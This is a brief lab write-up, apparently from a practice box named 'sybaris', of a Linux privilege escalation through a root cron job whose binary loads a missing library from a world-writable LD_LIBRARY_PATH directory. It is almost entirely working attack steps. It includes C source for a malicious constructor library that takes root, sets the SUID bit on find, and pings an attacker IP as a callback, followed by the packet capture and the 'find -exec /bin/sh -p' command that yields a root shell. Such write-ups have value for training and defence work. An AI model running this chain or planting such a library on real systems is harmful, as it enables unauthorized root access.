# 6 privesc cron

```
[pablo@sybaris ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper

# runs every minute

[pablo@sybaris ~]$ ls -la /usr/bin/log-sweeper
-rwxr-xr-x. 1 root root 8800 Sep  4  2020 /usr/bin/log-sweeper

[pablo@sybaris ~]$ /usr/bin/log-sweeper
/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory

# finding writable path in LD_LIBRARY_PATH:
[pablo@sybaris ~]$ ls -la /usr/local/lib/dev/
total 0
drwxrwxrwx  2 root root  6 Sep  7  2020 .
drwxr-xr-x. 4 root root 30 Sep  7  2020 ..

# Using code from linux_privesc (ld_library_path shell)
# include <stdio.h>
# include <stdlib.h>
# include <sys/types.h>

static void kashz() __attribute__((constructor));
void kashz() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("chmod +s /usr/bin/find");
	system("ping 192.168.49.201 -c 2");
}
# compile it
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:19:02.893410 IP 192.168.201.93 > 192.168.49.201: ICMP echo request, id 1886, seq 1, length 64
19:19:02.893429 IP 192.168.49.201 > 192.168.201.93: ICMP echo reply, id 1886, seq 1, length 64
19:19:03.895059 IP 192.168.201.93 > 192.168.49.201: ICMP echo request, id 1886, seq 2, length 64
19:19:03.895070 IP 192.168.49.201 > 192.168.201.93: ICMP echo reply, id 1886, seq 2, length 64

# worked

[pablo@sybaris dev]$ ls -la /usr/bin/find
-rwsr-sr-x. 1 root root 199304 Oct 30  2018 /usr/bin/find

[pablo@sybaris dev]$ /usr/bin/find . -exec /bin/sh -p \; -quit
sh-4.2# whoami;id
root
uid=1000(pablo) gid=1000(pablo) euid=0(root) egid=0(root) groups=0(root),1000(pablo)
```
